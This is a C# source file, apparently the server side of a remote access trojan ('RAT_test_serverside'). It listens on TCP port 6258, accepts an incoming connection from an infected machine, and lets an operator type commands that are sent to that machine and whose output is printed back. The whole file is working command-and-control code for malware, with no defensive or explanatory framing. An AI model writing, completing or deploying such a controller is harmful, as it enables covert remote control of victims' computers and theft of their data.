using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;

namespace RAT_test_serverside
{
    class Program
    {
        private static string cmd;
        private static TcpListener listener;
        private static TcpClient client;

        static void Main(string[] args)
        {
            //Create the tcplistener and start it 
            listener = new TcpListener(6258);
            listener.Start();

            //Infinte loop that waits for connection and prints out the data
            while (true) {
                Console.WriteLine("Awaiting connection:");
                client = listener.AcceptTcpClient();

                //Create the streams
                StreamReader sr = new StreamReader(client.GetStream());
                StreamWriter sw = new StreamWriter(client.GetStream());

                try
                {
                    //Get the data and print it out
                    string data = sr.ReadLine();
                    Console.WriteLine("Connected to: " + data);

                } catch (Exception e) { Console.WriteLine(e); }

                while (true)
                {
                    Console.WriteLine();
                    Console.WriteLine("Enter Command:");
                    cmd = Console.ReadLine();

                    try
                    {
                        Console.WriteLine("Sending: " + cmd);
                        sw.WriteLine(cmd);
                        sw.Flush();
                    }
                    catch (Exception e) { }

                    try
                    {
                        Console.WriteLine();
                        Console.WriteLine("OUTPUT:");
                        string data = String.Empty;
                        data = sr.ReadLine();
                        while (sr.Peek() != -1)
                        {
                            Console.WriteLine(data);
                            data = sr.ReadLine();
                        }
                    } catch(Exception e) { }
                }
                client.Close();
            }
        }

    }
}
